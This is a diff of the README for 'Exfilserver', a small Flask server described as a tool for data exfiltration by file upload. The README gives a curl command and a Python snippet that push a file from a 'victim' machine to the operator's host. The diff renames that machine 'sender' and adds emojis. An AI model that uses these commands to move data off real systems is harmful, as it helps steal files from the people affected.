@@ -1,15 +1,15 @@
-## Exfilserver
+# 📭 Exfilserver
 
-> Data exfiltration via upload using curl or similar...
+> 📨 Data exfiltration via upload using curl or similar... 
 
-### Run in you host:
+### Run in you server:
 
 ```sh
 pip install Flask \
 python3 server.py -p 80 -f /tmp/files
 ```
 
-### Upload from victim:
+### Upload from sender:
 
 > By Curl:
 
@@ -18,7 +18,7 @@ curl -X POST -F "file=@./file" http://<youhostname>:80/exf
 ```
 
 > By python:
-```
+```py
 import requests
 import sys
 
@@ -38,7 +38,7 @@ if __name__ == "__main__":
         print(f"Usage: python {sys.argv[0]} <server_url> <file_path>")
         sys.exit(1)
 
-    server_url = sys.argv[1]   # example: http://127.0.0.1:5000
+    server_url = sys.argv[1]   # example: http://127.0.0.1:80
     file_path = sys.argv[2]
     upload_file(server_url, file_path)
 ```
